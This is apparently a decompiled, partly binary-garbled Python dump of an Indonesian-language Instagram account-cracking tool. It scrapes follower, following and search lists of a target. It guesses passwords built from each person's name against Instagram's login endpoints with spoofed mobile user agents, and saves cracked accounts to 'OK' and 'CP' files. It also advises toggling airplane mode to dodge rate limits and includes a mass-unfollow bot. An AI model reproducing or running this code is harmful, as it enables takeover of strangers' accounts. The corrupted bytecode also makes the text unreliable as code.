   z?https://www.instagram.com/accounts/login/?force_classic_login=&�https://www.instagram.com�  Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)c                 C   s�   t dd��� }z8tjd| d| idtid�}|�� d d }|d	 }|d
 d }|d d }t�|� d|� d|� �� W t|fS  tyc   t	t
� d�� td� t�d� t�d� t�  Y t|fS w )N�	.usernamers   �#https://www.instagram.com/%s/?__a=1rn   r�   �r�   r�   �graphqlr�   �	full_name�edge_followed_by�count�edge_followr�  u4    [0m[[31m•[32m•[0m] [0mInstagram CheckpointrT  �
.kukis.log)r{   r|   r�   r�   �USNr�   �externalr  r�   r   ra   rW   r   r�   r-   )rn   r�   r   r  r�   �	followers�	followingr   r   r   �cekAPI$  s    �

�r�  c                  C   sT   z	t dd��� } W n ty   t�  Y nw t| �\}}d| i}t|||���  d S )Nr�  rs   rn   )r{   r|   r}   r4   r�  �	instagramr�   )rp   Zexr�   rn   r   r   r   r�   4  s   
�r�   c                  C   s:  z1t �d� d} tjj| dd�}tj�� �|� tdt	t
tttf �}tjdt	t
tttf d�}W n ty@   tdt � Y nw t||��� }|�d	�d
krztdd��|� tdd��|�d�� d|�d�i}tdtt
f � td� t�  d S |�d	�dkr�tdtt
f � td� d S tdtt
f � td� d S )Nr   z�# Login dengan akun instagram anda dan pastikan akun bersifat publik. Jika login checkpoint wajib gunakan akun baru, buat akun baru lewat browser chromer8   r9   z%s%s %s[0musername%s > %sz%s%s %s[0mpassword%s > %s)�promptu+   %s [0m[[31m•[32m•[0m] [0mTerhenti �status�successr�  r�   r�  rn   u   
%s%s [0mLogin Berhasil √r$   r�   z
%s%[0ms Akun terkena sesi z*
%s%s[0m Login gagal, silahkan coba lagi )r   r   �rich�markdownr6   �consoler7   r   r,   r_   r~   r`   ra   r   �	stdiomask�getpass�KeyboardInterruptr-   �instagramAPI�loginAPIr�   r{   r   rc   rW   r�   )�	catet_req�requ�usr�  ro   rn   r   r   r   r4   =  s(   
�
c                  C   s`   g d�} g d�}g d�}g d�}dt �|� d t �| � d t �|� d t �|� d	 }|S )
N)Z133�320Z515�160Z640�240Z120800Z480Z225Z768Z216Z1024)	z	Nokia 2.4�HUAWEIZGalaxyzUnlocked SmartphoneszNexus 6PzMobile Phones�Xiaomi�samsung�OnePlus)Z623x1280Z700x1245Z800x1280�	1080x2340Z	1320x2400Z	1242x2688)z114.0.0.20.2z114.0.0.38.120z114.0.0.20.70z114.0.0.28.120z114.0.0.0.24z114.0.0.0.41�
Instagram z Android (30/3.0; zdpi; z; huawei/google; z; angler; angler; en_US)r1  )Z	dpi_phoneZmodel_phoneZ	pxl_phoneZ	i_version�
User_Agentr   r   r   r  U  s   <r  c                  C   s�   g d�} g d�}g d�}t �|�}t �|�}t �| �}d�t �dd�t �dd�t �dd	�t �dd
�t �d
d�t �dd�||||�
S )N)Z720x1280Z320x480Z480x800Z1024x768Z1280x720Z768x1024Z480x320)zGT-N7000zSM-N9000zGT-I9220zGT-I9100)Z120r�  r�  r�  zQInstagram 4.{}.{} Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)r   r$   r   r�  �   rS  r9  )r   r2  �formatr   )ZresolutionsZversionsZdpisZver�dpiZresr   r   r   �
user_agenth  s(   








��r  c                  C   s�  d} d}| ddddddd	d
|d�
| dddddddd
|d�
| dddddddd|d�
| dddddddd|d�
| ddddddd d!|d�
| ddd"ddd#d$d
|d�
| d%d&dd'd(d)d*d*|d�
| d%d&ddd+d,d-d
|d�
| d%d&dddd.d/d|d�
d0�	}t �t|�� ��}|| d1 }|| d2 }|| d3 }|| d4 }|| d5 }|| d6 }	|| d7 }
|| d8 }|| d9 }|| d: }d;|� d<�d=|� d>|� d?� |� d?|� d?|	� d?� |
� d?|� d?|� d@|� dA� }|S )BNz136.0.0.34.124Z	208061712Z29z10.0Z420dpir�  r�  ZGM1903ZOnePlus7Zqcom)
�app_version�android_version�android_releaser  �
resolution�manufacturer�device�model�cpu�version_codeZ28z9.0Z	1080x1920zONEPLUS A3003ZOnePlus3Z26z8.0Z640dpiZ	1440x2560r�  zSM-G930FZherolteZsamsungexynos8890Z24z7.0r�  zLON-L29ZHWLONZhi3660zSM-G965FZstar2qltecsZsamsungexynos9810Z380dpizONEPLUS A3010Z	OnePlus3TZ23z6.0.1Z	1440x2392zLGE/lgeZRS988Zh1ZZTEz
ZTE A2017UZailsa_iizSM-G935Zhero2lte)	Z
one_plus_7Z
one_plus_3Zsamsung_galaxy_s7Zhuawei_mate_9_proZsamsung_galaxy_s9_plusZone_plus_3tZlg_g5Z
zte_axon_7Zsamsung_galaxy_s7_edger  r  r  r  r	  r
  r  r  r  r  r   r&   z	Android (r�   z; z	; en_US; �))r   r2  r(  �keys)ZAPP_VERSIONZVERSION_CODEZDEVICESZDEFAULT_DEVICEr  r  r  r  r	  r
  r  r  r  r  ZUSER_AGENT_BASEr   r   r   r3    s2   �
Pc                   @   sZ   e Zd ZdZddddd�Zdjdi e��ZdZd	Zd
Z	dd� Z
dd� Zdd� Zdd� ZdS )r�  zhttps://i.instagram.com/api/v1/r�  zHM 1SW�   z4.3)r
  r  r  r  zInstagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)Z@4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178a�1  ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_onr�   c                 C   sX   || _ || _t�� }|�|�d�|�d� � | �|�� �| _| �	d�| _
t�� | _d S )N�utf-8T)�username�password�hashlib�md5rm   �encode�generateDeviceId�	hexdigest�	device_id�generateUUID�uuidr�   r�  r   )r�   r  r  �mr   r   r   r�   �  s   zinstagramAPI.__init__c                 C   s:   d}t �� }|�|�d�|�d� � d|�� d d�  S )NrR  r  zandroid-�   )r  r  rm   r  r  )r�   ZseedZvolatile_seedr  r   r   r   r  �  s   zinstagramAPI.generateDeviceIdc                 C   s    t t�� �}|r
|S |�dd�S )Nr�  r%   )r�   r  Zuuid4ri   )r�   �typeZgenerated_uuidr   r   r   r  �  s   zinstagramAPI.generateUUIDc           	   
      s&  | j jddt� id�j}t�dt|��d }| j j�dddd	d
t	� d�� t
�| �d�|| j| j| j| jdd��| _d�| �d�tj�| j��| _| j �d| j�}t
�|j�}|j�� � d|jv r�d�� fdd�� D ��}|d d }|d d }|d d }d|| jd�S d|jv r�ddiS ddiS )N�https://www.instagram.com/r�   r�   �\"csrf_token\"\:\"(.*?)\"r   �close�*/*�0application/x-www-form-urlencoded; charset=UTF-8�
$Version=1�en-US��
Connection�AcceptzContent-typeZCookie2�Accept-Language�
User-AgentTrx   )Zphone_id�
_csrftokenr  Zguidr  r  Zlogin_attempt_count�&signed_body={}.{}&ig_sig_key_version=4Fz.https://i.instagram.com/api/v1/accounts/login/Zlogged_in_userrg   c                    s   g | ]
}|d  � |  �qS rx  r   )rz  �v�Zx_kukisr   r   r}  �  r~  z)instagramAPI.loginAPI.<locals>.<listcomp>�pkr�  Zphone_numberr�  )r�  rn   ZuserameZchallenge_requiredr�  r�   r�  )r   r�   r  r�   r�   r�   r�   r�   rm   r3  r�   �dumpsr  r  r  r  r  r\   r  �urllib�request�quote�payloadr�   r�   r�   r�  r*   )	r�   r�   �	crf_tokenro   �x_jasonrp   r�   ZnmZpnr   r/  r   r�  �  sD   
�
��


zinstagramAPI.loginAPINr   )r�   r�   r�   ZAPI_URLZDEVICE_SETTINTSr  Z
USER_AGENTZ
IG_SIG_KEYZEXPERIMENTSZSIG_KEY_VERSIONr�   r  r  r�  r   r   r   r   r�  �  s    �	r�  r%   c                   @   st   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dd� Zdd� Zdd� Zdd� Zdd� ZdS )r�  c                 C   s    || _ || _|| _t�� | _d S r   )Zextr  rn   r�   r�  r   )r�   r�  r  rn   r   r   r   r�   �  s   zinstagram.__init__c                 C   s�   t �d� tD ]}z|�d�d }|�d�d }|�d�d }W q   Y qt�  tdt� dt� dt� d	t� d
t� dt� dt� dt� dt� d�� d S )Nr   r�  r   r   r$   u   
 [0m[[31m•[32m•[0m]uA    01 [0mCrack Instagram dari pengikut
 [0m[[31m•[32m•[0m]uB    02 [0mCrack Instagram dari mengikuti
 [0m[[31m•[32m•[0m]uG    03 [0mCrack Instagram dari pencarian nama
 [0m[[31m•[32m•[0m]uB    04 [0mCrack Instagram secara target 
 [0m[[31m•[32m•[0m]u?    05 [0mCek status akun hasil crack
 [0m[[31m•[32m•[0m]u5    06 [0mBot auto unfollow
 [0m[[31m•[32m•[0m]u6    07 [0mBack menu facebook
 [0m[[31m•[32m•[0m]u.    rm [0mHapus akun
 [0m[[31m•[32m•[0m]z 00 [0mKeluar
	)r   r   r�  rk   rf   r   r�   ra   )r�   r  r�   r�  r�  r   r   r   �logo�  s8   
��������	�zinstagram.logoc                 C   s.  | � �  tdtttttf �}|dkr%tdttf � td� | �	�  d S |dv rStdt
ttf � tdt
ttttf �}| �| j|�}| �| jd|�}| �|� d S |d	v r�tdt
ttf � tdt
ttttf �}| �| j|�}| �| jd
|�}| �|� d S |dv r�tdt
ttf � ttdt
ttttf ��}td� t|�D ]}|d7 }tdt
tt|tttf �}| �| j|�}q�td� | �|� d S |dv r�t�  t�  d S |dv �retd� t�d�D ]}tdt
ttt|f � td� q�tdt
ttttf �}td| ��� �� }tdtttf � td� tdt
ttttt|�f � tdttttf � td� tdt
ttf � |D ]}	|	�d�d }
|	�d�d }| �|
|� �q>tdt
ttf � td� d S |dv �r�d}tdt
ttf � tdd ��� }t�d!|�d }| �| jd
|�}t D ]8}|d7 }t!t"t#�$t%d" t&d" �d" �� | �'|�}tt� t� d#t(|�� d#|� d#t� d$�	� | �)|d%| j� �q�td&t� d'�� | �	�  d S |d(v �r�t*�  d S |d)v �r�t�+d� t�+d*� t,d+ttf � t�  d S |d,v �rt�  d S tdttf � td� | �	�  d S )-N�%s%s %s[0mPilih %s> %sr%   z
%s%s[0m isi yang benarr$   ru   z8
%s%s %s[0mPerlu di ingat target harus bersifat publik z!%s%s %s[0mUsername target%s > %szEhttps://i.instagram.com/api/v1/friendships/%s/followers/?count=100000ry   zEhttps://i.instagram.com/api/v1/friendships/%s/following/?count=100000r�   zA
%s%s %s[0mSemakin banyak target semakin banyak id yg terkumpul r  r   z#%s%s%s %s %s[0mMasukan nama%s > %sr�   r�   rY   r�  r�  z
%s%s%[0ms masukan file %s:%s r�  r�  r�  z2
%s%s%s [0mMohon tunggu sedang mengecek akun ... r�  r   r�  r�   z)
%s%s %s[0mBot unfollow-All di jalankan r�  rs   zsessionid=(\d+)r�  r&   u   Unfollow Berhasil √Z
5452333948z
 u   [0m√ unfollow selesai ...r�   )r�   r�   r�   r�  z(
%s%s[0m Berhasil menghapus data login rw   )-r8  r,   r�   r~   r`   ra   r   r   rW   r�   r_   �idAPIrn   �infoAPI�passwordAPIr�   r  �	searchAPI�crack_targetr-   r   r�  r�  r{   r|   r�  rc   rl   rk   �checkAPIr�   r�   r�  r   r5   r   Zuniform�nyMnD�nyMxD�sixAPIr�   �unfollowAPIr�   r�   rX   )r�   r   r  r�   r�   r  r�   r  r�  r   r�  r�  Zsixro   Zx_idZback�six_idr   r   r   r�   �  s�   

 
 
(







zinstagram.menuc                 C   s>   d| d }t �|�}|�� }t|d d �d��d��}|S )NzFhttps://www.instagram.com/web/search/topsearch/?context=blended&query=z&&rank_token=0.3953592318270893&count=1�usersr   r�   r0  )r�   r�   r�   r�   )r�   rD  r�   ro   r7  rW  r   r   r   rB  F  s
   
zinstagram.sixAPIc              	   C   s�   t d�}| jjddt� id�j}t�dt|��d }tj�	ddd	d
dt� d�� t
�||||d��}d�| � d�tj�|��| _tjd| | j|d�jS )NTr   r�   r�   �'{"config":{"csrf_token":"(.*)","viewer"r   r"  r#  r$  r%  r&  r'  )Z_uuidZ_uid�user_idr,  r-  Fz6https://i.instagram.com/api/v1/friendships/destroy/%s/r�   )r  r   r�   r  �contentr�   r�   r�   r�   rm   r�   r1  r  r2  r3  r4  r5  r�   r�   )r�   rG  Zusername_idrn   r  r�  r6  r\   r   r   r   rC  M  s(   ��
�zinstagram.unfollowAPIc           	      C   s�   z2t jd| |dtid�}t�|j�}|d D ]}|d }|d }|d }t�|� d|� �� qW tS  tj	j
yG   td	tttf � Y tS w )
Nz�https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=truer�   r�  rE  r�   r  r�  r�  �
%s%s [0mtidak ada koneksi%s
)r   r�   r�  r�   r�   r�   �internalr  r�   r�   r   r-   ra   r~   r�   )	r�   rn   r�   ro   r7  r  r�   r  �fullnamer   r   r   r=  `  s   ���zinstagram.searchAPIc              
   C   s�   zt jd| |dtid�}|�� d d }|d }W |S  tjjy0   tdtt	t
f � Y |S  tyK } ztdtt	t
f � W Y d }~|S d }~ww )	Nr�  r�   r�  r�  r�   r�   rI  zK
%s%s[0m username yg anda masukan salah pastikan target bersifat publik%s
)r   r�   r�  r�   r�   r�   r   r-   ra   r~   r�   r+  )r�   rn   r�   r  Zm_jasonZidxr-  r   r   r   r:  m  s   
����zinstagram.idAPIc           
   
   C   s�   z3t j|| |dtid�}t�|j�}|d D ]}|d }|d }t�|� d|� �� t�|� qW tS  t	j
jyH   tdtttf � Y tS  tyc }	 ztdtttf � W Y d }	~	tS d }	~	ww )	Nr�   r�  rE  r  r�  r�  rI  zK
%s%s [0musername yg anda masukan salah pastikan target bersifat publik%s
)r   r�   r�  r�   r�   r�   rJ  r  r�  r�   r�   r   r-   ra   r~   r�   r+  )
r�   rn   Zapir�   ro   r7  r  r  r�   r-  r   r   r   r;  x  s$   �	����zinstagram.infoAPIc              	   C   s>  t dttttttt�f � t d�g d�t� �t� �d�t� �d�t� �t	� �d�t� �d�t� �d�t� �d	�t� �t	� �d
�t� �d�t	� �d�t� �d�t� �t	� �d�t� �d�t� �d�t� �d��� t
dt	ttttf �}|dkr�| �||� d S |dkr�| �||� d S |dkr�| �||� d S | �|� d S )Nz%s%s%s [0mTotal user %s> %s%sr%   r	   u0   [0m [ pilih methode crack, silahkan coba satu²� ]

� 01 z[0mMethode zV.1 z[0m(cepat)
� 02 zV.2 z[0m(lambat)
� 03 zV.3 z[0m(sangat lambat)
		r9  rv   rz   r�   )r   r_   r~   r`   ra   rc   rl   rJ  r*   r�   r,   r   �generateAPIr<  )r�   Zxnxr   r   r   r   r<  �  s\   ������������������zinstagram.passwordAPIc                 C   s(  t dt� t� dt� dt� t� dt� dt� t� dt� dt� t� dt� d	�� td
tttttf �}|dkr8t� }n|dkr@t� }n|dkrGt	� }t d�
g d�t� �t� �d�t� �d�t� �d�t� �d�t� �d�t� �d�t� �t� �d�t� �d�t� �d�t� �d�t� �d�t� �d�t� �d�t� �d�t� �d��� tdd���}|D ]�}z�|�d�d }|�d�d �� }|�d �D ]�}	t|	�d!k r�q�|	�� }	|dkr�t|	�d!ks�t|	�d"ks�t|	�d#kr�|	d$ |	d% g}
�q[|	d$ |	d% g}
nd|dk�r&t|	�d!k�st|	�d"k�st|	�d#k�r|	|	d$ |	d% g}
�q[|	|	d$ |	d% g}
n5|dk�r[t|	�d!k�s@t|	�d"k�s@t|	�d#k�rN|	|	d$ |	d% |	|�� g}
n|	|	d$ |	d% |	|�� g}
|�| j||
|� q�W q�   Y q�W d   � n	1 �sww   Y  t d&ttf � td'tttttf � t�  d S )(Nr	   u-   [0m [ pilih user-agent, silahkan coba satu²rL  rM  z[0mUser-Agent 1
rN  z[0mUser-Agent 2
rO  z[0mUser-Agent 3
		r9  rv   rz   r�   r%   z
 [0makun z[OK] z[0mtersimpan ke file r�   �IG/OK-z.txt
r  r[   r  zIG/CP-u    .txt
 [0m[[31m•[32m•[0m]z8 [0msetiap crack 1k ID, mainkan mode pesawat 3 detik
		r=  r>  r�  r   r   r&   rS  rT  r9  rQ  rR  u   
%s%s[0mCracks Selesai √r�  )r   r~   r`   r�   r,   ra   r   r  r  r3  r*   rc   r�  r   rk   r*  rl   rB  �crackAPIr_   r�   )r�   r�   r   r7  �uaAPIZshinkair  r  r  r:   Zsandir   r   r   rP  �  s�   �����������
������������������$
*
*���
zinstagram.generateAPIc                 C   sl   z+t jd| dtid�}|�� d d }|d }|d d }|d	 d }|d
 d }W n   Y ||||fS )Nr�  r�   r�   r�  r�   r�  r�  r�  r�  Zedge_owner_to_timeline_media)r   r�   r�  r�   )r�   r�   ro   r7  r�   �pengikut�mengikutr�   r   r   r   �APIinfo�  s   zinstagram.APIinfoc                 C   s�  t �tttttttt	g�}t
j�d| dttt�ttttt�tf  �f t
j��  �z|D �]}t�d�}i dd�d|�dd�d	d
�dd�d|jd �dd�dd�dd�dd�dd�dd�dd�dd�dd �d!d�}|d"�t �d#d$�|�d%i d&i d'�}tjd(||d)�}	t�|	j�}
d*t|
�v �r| �|�\}}}}td&�g d�t	� �d+�t	� �d,�t� �d-�t� �d.�t� �|� �d/�t� �|� �d0�t	� �d,�t� �d1�t� �d.�t� �|� �d/�t� �|� �d0�t	� �d,�t� �d2�t� �d.�t� �|� �d3��� td4t � d5�d6��|� d7|� d7|� d7|� d0�� t�!|�  �qAd8t|	j�v �r@t
j�dt� d9�� t
j��  t"d:� | �#|||� q.q.td;7 aW d S    | �#|||� Y d S )<Nr  z'[1;96m [0m[crack] %s/%s %sOK%s:%s%s%s�)https://www.instagram.com/accounts/login/r�   �www.instagram.comr+  r)  r�   r*  zid,en-US;q=0.7,en;q=0.3�Accept-Encoding�gzip, deflate, br�X-CSRFTokenZ	csrftokenzX-Instagram-AJAXZ1d6caaf37cd2zX-IG-App-ID�936619743392459z	X-ASBD-IDZ437806zX-IG-WWW-Claimrx   zContent-Typerr  �X-Requested-With�XMLHttpRequestzContent-LengthZ347ZOriginr�  r(  z
keep-alive�Referer�#PWD_INSTAGRAM_BROWSER:0:{}:{}� ʚ;�   �g�] Fr%   �r  Zenc_passwordZoptIntoOneTapZqueryParamsZstopDeletionNonceZtrustedDeviceRecords�.https://www.instagram.com/accounts/login/ajax/)r�   r\   �userIdzA[0m*--> [0mBerhasil Login \_>[32m Ok[0m                     
�[0m*-->z[0m Username  r�   �    • r	   �[0m Followers z [0mPostingan �
